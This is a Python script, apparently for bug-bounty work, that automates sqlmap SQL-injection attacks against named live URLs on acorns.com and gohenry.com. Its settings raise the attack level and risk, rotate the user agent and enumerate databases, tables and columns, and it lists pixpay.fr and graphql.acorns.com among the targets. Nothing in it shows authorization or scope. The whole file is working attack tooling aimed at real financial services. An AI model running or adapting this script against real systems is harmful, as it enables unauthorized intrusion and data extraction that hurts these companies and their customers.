#!/usr/bin/env python3

import subprocess
import json
import re

def extract_database_info(sqlmap_output):
    """Extract database information from SQLMap output"""
    databases = []
    tables = []
    columns = []
    
    # Database patterns
    db_patterns = [
        r'available databases \[(\d+)\]:(.*?)(?=\n\[|\n$)',
        r'Database: (\w+)',
    ]
    
    # Table patterns  
    table_patterns = [
        r'Database: \w+\s+\[(\d+) tables?\]:(.*?)(?=Database:|$)',
        r'Table: (\w+)',
    ]
    
    # Column patterns
    column_patterns = [
        r'Table: \w+\s+\[(\d+) columns?\]:(.*?)(?=Table:|Database:|$)',
        r'Column: (\w+)',
    ]
    
    for pattern in db_patterns:
        matches = re.findall(pattern, sqlmap_output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                dbs = [db.strip() for db in match[1].split(',') if db.strip()]
                databases.extend(dbs)
            else:
                databases.append(match.strip())
    
    for pattern in table_patterns:
        matches = re.findall(pattern, sqlmap_output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                tbls = [table.strip() for table in match[1].split(',') if table.strip()]
                tables.extend(tbls)
            else:
                tables.append(match.strip())
    
    for pattern in column_patterns:
        matches = re.findall(pattern, sqlmap_output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                cols = [col.strip() for col in match[1].split(',') if col.strip()]
                columns.extend(cols)
            else:
                columns.append(match.strip())
    
    return {
        'databases': list(set(databases)),
        'tables': list(set(tables)),
        'columns': list(set(columns))
    }

def test_url_with_sqlmap(url):
    """Test a single URL with SQLMap for detailed information"""
    print(f"[+] Deep testing {url} with SQLMap...")
    
    try:
        cmd = [
            'sqlmap',
            '-u', url,
            '--batch',
            '--random-agent',
            '--timeout=60',
            '--retries=2',
            '--level=2',
            '--risk=2',
            '--technique=BEUSTQ',
            '--dbs',
            '--tables',
            '--columns',
            '--threads=3'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        
        if 'vulnerable' in result.stdout.lower() or 'injectable' in result.stdout.lower():
            db_info = extract_database_info(result.stdout)
            return {
                'url': url,
                'vulnerable': True,
                'output': result.stdout,
                'databases': db_info['databases'],
                'tables': db_info['tables'],
                'columns': db_info['columns']
            }
        else:
            return {
                'url': url,
                'vulnerable': False,
                'output': result.stdout[:200] + "..." if result.stdout else "No output"
            }
            
    except subprocess.TimeoutExpired:
        print(f"[-] Timeout testing {url}")
        return {'url': url, 'vulnerable': False, 'error': 'Timeout'}
    except Exception as e:
        print(f"[-] Error testing {url}: {e}")
        return {'url': url, 'vulnerable': False, 'error': str(e)}

def main():
    print("=== Bug Bounty SQL Injection Results Summary ===")
    
    # Based on the scanner output, these URLs showed potential vulnerabilities
    vulnerable_urls = [
        'https://www.acorns.com/learn/search/?q=invest',
        'https://www.acorns.com/learn/?page=3',
        'https://www.acorns.com/learn/search/?p=3&q=invest',
        'https://www.acorns.com/learn/search/?q=traditional+ira+vs+Roth+ira',
        'https://www.acorns.com/learn/search/?p=7&q=invest',
        'https://www.acorns.com/support/search/?q=password',
        'https://www.acorns.com/learn/search/?p=2&q=invest',
        'https://www.gohenry.com/us/terms-and-conditions/?q=traditional+ira+vs+Roth+ira',
        'https://www.acorns.com/learn/kiersten-schmidt/?page=3',
        'https://www.acorns.com/learn/borrowing/?page=3',
        'https://www.acorns.com/learn/borrowing/?page=2',
        'https://www.acorns.com/learn/?page=2'
    ]
    
    print(f"Found {len(vulnerable_urls)} potentially vulnerable URLs")
    print("Testing top URLs for detailed information...\n")
    
    results = []
    
    # Test the most promising URLs
    for url in vulnerable_urls[:8]:  # Test first 8 URLs
        result = test_url_with_sqlmap(url)
        results.append(result)
        
        if result.get('vulnerable'):
            print(f"[!] CONFIRMED VULNERABLE: {url}")
            if result.get('databases'):
                print(f"    Databases: {', '.join(result['databases'])}")
            if result.get('tables'):
                print(f"    Tables: {', '.join(result['tables'])}")
            if result.get('columns'):
                print(f"    Columns: {', '.join(result['columns'])}")
            print()
    
    # Save detailed results
    with open('detailed_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    # Create summary report
    vulnerable_count = sum(1 for r in results if r.get('vulnerable'))
    
    with open('final_report.txt', 'w') as f:
        f.write("=== BUG BOUNTY SQL INJECTION SCAN RESULTS ===\n\n")
        f.write("Target Domains:\n")
        f.write("- acorns.com\n")
        f.write("- gohenry.com\n") 
        f.write("- pixpay.fr\n")
        f.write("- graphql.acorns.com\n\n")
        
        f.write(f"URLs Tested: {len(results)}\n")
        f.write(f"Vulnerable URLs: {vulnerable_count}\n\n")
        
        if vulnerable_count > 0:
            f.write("=== VULNERABLE URLS ===\n\n")
            for result in results:
                if result.get('vulnerable'):
                    f.write(f"URL: {result['url']}\n")
                    f.write("Status: VULNERABLE\n")
                    if result.get('databases'):
                        f.write(f"Databases: {', '.join(result['databases'])}\n")
                    if result.get('tables'):
                        f.write(f"Tables: {', '.join(result['tables'])}\n")
                    if result.get('columns'):
                        f.write(f"Columns: {', '.join(result['columns'])}\n")
                    f.write("-" * 50 + "\n\n")
        else:
            f.write("No confirmed SQL injection vulnerabilities found in detailed testing.\n")
    
    print(f"\n=== FINAL SUMMARY ===")
    print(f"URLs tested: {len(results)}")
    print(f"Confirmed vulnerable: {vulnerable_count}")
    print("Results saved to:")
    print("- detailed_results.json")
    print("- final_report.txt")

if __name__ == "__main__":
    main()